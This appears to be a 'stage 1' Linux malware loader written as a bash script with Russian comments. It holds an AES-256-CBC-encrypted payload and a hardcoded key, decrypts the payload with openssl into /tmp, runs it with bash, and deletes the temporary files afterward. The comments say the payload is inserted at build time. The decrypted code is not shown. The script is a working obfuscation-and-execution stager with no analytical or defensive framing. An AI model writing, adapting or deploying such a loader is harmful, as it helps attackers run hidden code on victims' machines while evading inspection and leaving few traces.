#!/bin/bash
# AES-256-CBC decryptor template for Linux stage 1

PAYLOAD="c980d0ade6f1475531c7943d229b7473:jKvOmjmHyIbdxYjXPBenEHfvKDgZZEtVGxxTmYYYmL6vnWqQueWHGdoi9XCJV1+xAjuF9ILct6QX34PrGKNpcYeRwwv6yTNnLPRnaDEW4+6sejJgvhX1D3LeizWwEIlJx4JCyDMyPezqFksBbhth8D8DA92xlqCswcrxSQVr3n6i4mdWLmTtwMByWLigwgROLbUWmCHlRxh2m/Mip2CadtC8Hp4NkbuCYZtH5gz4Hz9jLyraKE5JjkEHYPThTf6l05kFnND7r69JAydyF1ss+K74moRgClGrst/1rorpTfM8gcJ8vE93XoP8gLBJGiCLhStGRrWb+wlOpDga7xYz14LVTeyGjTnIgCbcJ23GzJtq1G8sbVSfO934EgNQh7JXr8VPcfnsp3jBxEqy+m4vpzw3gqj1pzhFVwFLi3umQDFWE4taarElaXrK1xjbnfU6qqfMiLKU0zoGOVZcqFpq2YG/1XOzRXpHZImBycgIOOFWyF/UDcRPWn55APTEB6XrDSaS52tc+LF6iHOJ/I/SaIjrnCGiJouhFinigLV51zA="  # encrypted ivhex:base64cipher, вставится на сборке
KEY="Zxcvbnm1234567890Zxcvbnm12345678"      # AES ключ, совпадает с .env ENCRYPTION_KEY

iv=$(echo "$PAYLOAD" | cut -d: -f1)
cipher=$(echo "$PAYLOAD" | cut -d: -f2)

# Декодируем base64 в бинарник
echo "$cipher" | base64 -d > /tmp/cipher.bin

# Расшифровываем с помощью openssl
openssl enc -d -aes-256-cbc -K $(echo -n $KEY | xxd -p) -iv $iv -in /tmp/cipher.bin -out /tmp/plaintext.sh

# Запускаем payload
bash /tmp/plaintext.sh

# Удаляем временные файлы
rm -f /tmp/cipher.bin /tmp/plaintext.sh
